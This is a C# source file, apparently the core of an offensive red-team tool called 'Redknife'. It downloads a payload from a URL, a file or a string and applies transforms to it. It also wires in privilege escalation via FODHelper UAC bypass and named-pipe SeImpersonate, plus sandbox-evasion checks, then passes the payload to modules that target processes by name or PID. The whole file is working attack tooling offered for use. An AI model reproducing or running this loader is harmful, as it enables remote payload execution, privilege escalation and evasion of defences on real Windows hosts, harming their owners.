using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text.RegularExpressions;

using Redknife.Modules;
using Redknife.Util;

namespace Redknife
{

    public struct Module
    {

        public string Name { get; set; }

        public Type ModuleType { get; set; }

        public string Description { get; set; }

        public Module(string name, Type type, string description)
        {
            this.Name = name;
            this.ModuleType = type;
            this.Description = description;
        }

    }

    public class RedknifeArgs : IArguments
    {
    
        // A payload can be specified 3 ways - url, file, and directly via the --payload parameter

        [Argument("--url", Description = "Sets the URL from which to download a payload to execute")]
        public string PayloadURL { get; set; }

        [Argument("--file", Description = "Sets the local file from which to load the payload to execute")]
        public string PayloadFile { get; set; }

        [Argument("--payload", Description = "The payload to execute")]
        public string PayloadString { get; set; }

        [Argument("--evasion", Description = "Whether to use evasion or not")]
        public bool UseEvasion { get; set; }

        [Argument("--pipe-name", Description = "The name of the Named Pipe to operate on")]
        public string PipeName { get; set; }

        [Argument("--service-name", Description = "The name of the Service to operate on")]
        public string ServiceName { get; set; }

        [Argument("--host-name", Description = "The name of the host target")]
        public string HostName { get; set; }

        [Argument("--transforms", Description = "Sets the list of transformations to apply to the payload")]
        public string[] Transforms { get; set; }

        [Argument("--escalate", Description = "Sets the priv esc method to use", Values = new string[] { "FODHelper", "NamedPipeSeImpersonate" })]
        public String EscalationType { get; set; }

        [Argument("--module", Description = "The name of the module to execute", ValuesEnum = typeof(ModuleDefinition))]
        public string ModuleName { get; set; }

        [Argument("--process", Description = "Sets the name of the process to operate on (functionality determined by module specified)")]
        public string ProcessName { get; set; }

        [Argument("--pid", Description = "Sets the PID to operate on (functionality determined by module specified)")]
        public int? PID { get; set; }

        [Argument("--quiet", Description = "Suppresses console output from Redknife")]
        public bool Quiet { get; set; }

        [Argument("--debug", Description = "Shows debug output from Redknife")]
        public bool Debug { get; set; }

        [Argument("--output-file", Description = "Determines where output will be written (if applicable)")]
        public string OutputFile { get; set; }

        [Argument("--help", Description = "Prints the help")]
        public bool Help { get; set; }
    }

    [ComVisible(true)]
    public class Redknife
    {

        private Dictionary<string, ModuleDefinition> modules;
        public RedknifeArgs Arguments { get; set; }

        public Redknife()
        {
            // Parse current modules into a dictionary
            this.modules = new Dictionary<string, ModuleDefinition>();
            foreach (ModuleDefinition module in Enum.GetValues(typeof(ModuleDefinition)))
            {
                this.modules.Add(module.GetName(), module);
            }
        }

        public void ParseArguments(string[] args)
        {
            try
            {
                ArgumentParser<RedknifeArgs> parser = new ArgumentParser<RedknifeArgs>();
                RedknifeArgs parsedArgs = parser.ParseArguments(args);
                this.Arguments = parsedArgs;
            }
            catch (Exception ex)
            {
                LogUtil.Error("ERROR - Could not parse command-line arguments: ");
                LogUtil.Error(ex.Message, 1);
            }
        }

        // See https://intellitect.com/blog/converting-command-line-string-to-args-using-commandlinetoargvw-api/
        public void ParseArgumentsFromString(string argsStr)
        {
            IntPtr result = APIs.Shell32.CommandLineToArgvW(argsStr, out int argCount);
            if (result == IntPtr.Zero)
            {
                throw new Exception("Could not parse args string: " + Marshal.GetLastWin32Error());
            }

            try
            {
                IntPtr pStr = Marshal.ReadIntPtr(result, 0);
                string[] args = new string[argCount];
                for (int i=0; i< args.Length; i++)
                {
                    pStr = Marshal.ReadIntPtr(result, i * IntPtr.Size);
                    string arg = Marshal.PtrToStringUni(pStr);
                    args[i] = arg;
                }
                LogUtil.Info("Parsed {0} arguments from string", 0, args.Length);
                this.ParseArguments(args);
            }
            finally
            {
                Marshal.FreeHGlobal(result);
            }
        }

        public void Validate()
        {
            // If we have a module specified, check that it is valid
            string moduleName = this.Arguments.ModuleName;
            if (moduleName != null && !this.modules.ContainsKey(moduleName))
            {
                throw new Exception("No module definition for key '" + this.Arguments.ModuleName + "' - exiting");
            }
        }

        public void Run()
        {
            // Set the logging level - quiet overrides debug!
            if (this.Arguments.Quiet)
            {
                LogUtil.SetLogLevel(LogUtil.NONE);
            }
            else if (this.Arguments.Debug)
            {
                LogUtil.SetLogLevel(LogUtil.DEBUG);
                PrintStartArgs(this);
            }
            LogUtil.Info("Logging level: {0}", 0, LogUtil.GetLogLevel().Name);

            // Validate the args
            this.Validate();

            // First, get any payload specified - avoids infinite mscorlib exception when using priv esc
            byte[] payload = this.GetPayload();

            // Order:
            // 1. check for priv esc
            // 2. Check for cmds to execute
            // 3. Check for any modules to execute

            if (this.Arguments.EscalationType != null)
            {
                bool stopExecution = this.DoEscalation();
                if (stopExecution)
                {
                    LogUtil.Info("Stopping execution (as per escalation method");
                    return;
                }
            }

            // Should we try evasion techniques? - TODO: expand on this
            if (this.Arguments.UseEvasion)
            {
                this.DoEvasion();
            }

            // Apply any transformations
            payload = this.TransformPayload(payload);

            // Now get module instance
            BaseModule module = this.GetModuleInstance();

            // Set additional props & validate the module
            module.Args = this.Arguments;
            module.Payload = payload;

            // Validate the module
            module.Validate();

            // Actually execute the module
            module.Run();
        }

        protected bool DoEscalation()
        {
            LogUtil.Info("Performing privilege escalation");
            
            Escalation.BaseEscalationMethod escalationMethod = null;
            switch (this.Arguments.EscalationType)
            {
                case "FODHelper": 
                    escalationMethod = new Escalation.FODHelper(this.Arguments); 
                    break;
                case "NamedPipeSeImpersonate":
                    escalationMethod = new Escalation.NamedPipeSeImpersonate(this.Arguments);
                    break;
                default: 
                    throw new Exception("Unsupported escalation method: " + this.Arguments.EscalationType);
            }

            // Validate the escalation method
            escalationMethod.Validate();

            // execute the escalation
            escalationMethod.Execute();

            LogUtil.Debug("Escalation done", 1);

            return escalationMethod.ShouldStopExecution();
        }

        protected void DoEvasion()
        {
            if (Evasion.TestSleep(2000))
            {
                throw new Exception("TestSleep failed - artificial clock detected");
            }

            if (Evasion.TestFlsAlloc())
            {
                throw new Exception("TestFlsAllow failed");
            }
        }

        protected BaseModule GetModuleInstance()
        {
            return (BaseModule)Activator.CreateInstance(this.modules[this.Arguments.ModuleName].GetModuleType());
        }

        public byte[] GetPayload()
        {
            byte[] payload = null;
            if (this.Arguments.PayloadURL != null)
            {
                LogUtil.Info("Attempting to read payload from URL: {0}", 0, this.Arguments.PayloadURL);
                try
                {
                    payload = GetPayloadFromURL(this.Arguments.PayloadURL);
                }
                catch (Exception ex)
                {
                    throw new Exception("Could not get payload from URL '" + this.Arguments.PayloadURL + "': " + ex.Message);
                }
            }
            if (this.Arguments.PayloadFile != null)
            {
                try
                {
                    LogUtil.Info("Attempting to read payload from file: {0}", 0, this.Arguments.PayloadFile);
                    payload = GetPayloadFromFile(this.Arguments.PayloadFile);
                }
                catch (Exception ex)
                {
                    throw new Exception("Could not get payload from file '" + this.Arguments.PayloadFile + "': " + ex.Message);
                }
            }
            if (this.Arguments.PayloadString != null)
            {
                LogUtil.Info("Loading payload from string provided: {0}", 0, this.Arguments.PayloadString);
                payload = System.Text.Encoding.ASCII.GetBytes(this.Arguments.PayloadString);
            }

            if (payload != null)
            {
                LogUtil.Info("OK! Payload contains {0} bytes", 1, payload.Length);
                LogUtil.PrintBlock("Payload:", System.Text.Encoding.ASCII.GetString(payload));
            } else
            {
                LogUtil.Info("No Payload specified");
            }

            return payload;
        }


        public byte[] TransformPayload(byte[] payload)
        {
            if (this.Arguments.Transforms == null || this.Arguments.Transforms.Length == 0)
            {
                LogUtil.Info("No payload transformations to apply");
            }
            else { 
                LogUtil.Info("Transforming payload - {0} pending transformations", 0, this.Arguments.Transforms.Length);
                payload = Transform.TransformBuffer(this.Arguments.Transforms, payload);
                LogUtil.Info("Finished transforming buffer: applied {0} transformations", 0, this.Arguments.Transforms.Length);
            }
            return payload;
        }

        /**
         * Simply returns the next argument in the args array as the assumed value (unless the next arg starts with "--", in which case an exception is thrown).
         * For instance: If args passed to exe are: --foo bar
         * GetArgumentValue("--foo", ["--foo","bar"], 1) => returns "bar"
         */
        public static string GetArgumentValue(string argname, string[] args, int i)
        {
            if (i < args.Length)
            {
                string arg = args[i];
                if(arg.StartsWith("--"))
                {
                    throw new Exception("Could not get value for argument '" + argname + "' - no value provided");
                }
                return arg;
            } else
            {
                throw new Exception("Could not get value for argument '" + argname + "' - not enough arguments provided");
            }
        }

        public static int GetArgumentValueAsInt(string argname, string[] args, int i)
        {
            string val = GetArgumentValue(argname, args, i);
            return Int32.Parse(val);
        }

        public static byte[] GetPayloadFromURL(string url)
        {
            WebClient client = new WebClient();
            return client.DownloadData(url);
        }

        public static byte[] GetPayloadFromFile(string path)
        {
            return File.ReadAllBytes(path);
        }

        public static void PrintStartArgs(Redknife redknife)
        {
            LogUtil.Debug("Starting Redknife with options:");
            LogUtil.Debug("- URL: {0}", 1, redknife.Arguments.PayloadURL);
            LogUtil.Debug("- File: {0}", 1, redknife.Arguments.PayloadFile);
            if (redknife.Arguments.Transforms != null && redknife.Arguments.Transforms.Length > 0)
            {
                LogUtil.Debug("- Transforms:", 1);
                for (int i = 0; i < redknife.Arguments.Transforms.Length; i++)
                {
                    LogUtil.Debug("[{0}]: {1}", 2, (i+1), redknife.Arguments.Transforms[i]);
                }
            }
            LogUtil.Debug("- Use Evasion: {0}", 1, redknife.Arguments.UseEvasion);
            LogUtil.Debug("- Escalate: {0}", 1, redknife.Arguments.EscalationType);
            LogUtil.Debug("- Module: {0}", 1, redknife.Arguments.ModuleName);
            LogUtil.Debug("- PID: {0}", 1, redknife.Arguments.PID);
            LogUtil.Debug("- Process Name: {0}", 1, redknife.Arguments.ProcessName);

            LogUtil.Debug("- Quiet: {0}", 1, redknife.Arguments.Quiet);
            LogUtil.Debug("- Debug: {0}", 1, redknife.Arguments.Debug);
            LogUtil.Debug("- Help: {0}", 1, redknife.Arguments.Help);
        }

    }

}